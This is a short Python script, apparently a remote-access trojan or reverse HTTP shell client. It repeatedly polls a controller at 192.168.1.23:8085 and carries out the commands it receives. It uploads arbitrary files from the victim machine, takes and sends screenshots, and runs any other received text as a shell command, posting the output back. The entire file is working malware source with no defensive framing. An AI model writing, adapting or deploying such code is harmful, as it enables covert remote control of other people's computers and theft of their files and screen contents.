#  grab and screen shot reverse http
import requests
import os
import subprocess
import time
# need find solution
from PIL import ImageGrab
import tempfile
import shutil


while True:
    req = requests.get('http://192.168.1.23:8085')
    command = req.text
    if 'terminate' in command:
        break
    elif 'grab' in command:
        grab, path = command.split("*")
        if os.path.exists(path):
            url = "http://192.168.1.23:8085/store"
            files = {'file': open(path, 'rb')}
            r = requests.post(url, files=files)
        else:
            post_response = requests.post(url='http://192.168.1.23:8085', data='[-] Not able to find the file!'.encode())

    elif 'screencap' in command:

        dirpath = tempfile.mkdtemp()
        ImageGrab.grab().save(dirpath + "\img.jpg", "JPEG")

        url = "http://192.168.1.23:8085/store"
        files = {'file': open(dirpath + "\img.jpg", 'rb')}
        r = requests.post(url, files=files)

        files['file'].close()
        shutil.rmtree(dirpath)

    else:
        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        post_response = requests.post(url='http://192.168.1.23:8085', data=CMD.stdout.read())
        post_response = requests.post(url='http://192.168.1.23:8085', data=CMD.stderr.read())
    time.sleep(3)
